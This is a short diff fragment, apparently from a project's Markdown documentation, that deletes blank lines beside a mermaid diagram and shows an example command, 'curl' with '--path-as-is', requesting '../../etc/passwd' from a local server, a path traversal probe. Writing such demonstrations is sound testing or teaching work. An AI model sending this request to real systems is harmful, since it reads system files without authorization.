@@ -58,9 +58,5 @@ graph TB
 ```
 
 
-
-
-
-
 `curl http://localhost:1337/../../etc/passwd --path-as-is `
 
